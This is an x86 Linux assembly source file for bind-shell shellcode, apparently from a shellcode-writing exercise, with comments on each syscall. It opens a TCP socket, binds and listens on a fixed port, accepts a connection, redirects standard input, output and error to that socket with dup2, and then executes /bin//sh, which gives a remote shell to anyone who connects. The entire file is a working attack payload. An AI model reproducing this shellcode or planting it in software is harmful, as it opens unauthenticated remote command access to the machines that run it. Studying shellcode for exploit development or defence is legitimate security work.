global _start

section .text
_start:
;clear out registers

       xor eax, eax
       xor ebx, ebx
       xor edx, edx
	
;create socket
;int socket(int domain, int type, int protocol)
;int socket(2, 1, 0)

	push eax
	push 0x01
	push 0x02
	mov ecx, esp      ;ecx knows top of the stack now                
	mov al, 0x66
        inc bl
	int 0x80
	
	mov esi, eax		; store socket descriptor to esi 

;bind to address
;int bind (int sockfd, const struct sockaddr *addr, socklen_t addrlen)
;int bind(esi, struct, 0x10)

;sockaddr_in structure:

	mov al, 0x66
        inc bl
	push edx		; address to bind
	push word 0xdddd        ; port number
	push word 0x02		; push AF_INET
	mov ecx,esp		; mov structure pointer in ecx
                        
	                    
	push 0x10
	push ecx
	push esi                        
	mov ecx, esp		;ecx points to arg
	int 0x80

;listen
;int listen(int sockfd, int backlog)
;int listen(esi,0)

	mov al, 0x66
        mov bl, 0x04
	push edx
	push esi
	mov ecx, esp		; ecx points to args on stack
	int 0x80

;accept
;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
;int accept(esi,0,0,0)

	mov al, 0x66
        inc bl
	push edx
	push edx                    
	push esi
	mov ecx, esp
	int 0x80

	mov ebx,eax ; get new file descriptor for dup() call

;duplicate STD
;int dup2(int oldfd, int newfd);
;
  
    mov al,0x3f
    xor ecx,ecx
    int 0x80
 
    ; call dup2(client_socket, 1) syscall
    mov al,0x3f
    inc ecx
    int 0x80
     
    ; call dup2(client_socket, 2) syscall
    mov al,0x3f
    inc ecx
    int 0x80
	
; execve
; int execve(const char *filename, char *const argv[], char *const envp[]);
; int execve(string addr, zero, NULL)

	push edx
	push 0x68732f2f      ; hs//
	push 0x6e69622f      ; nib/
	mov ebx, esp         ; pointer to command string
	mov ecx, edx
	mov al, 0xb
	int 0x80
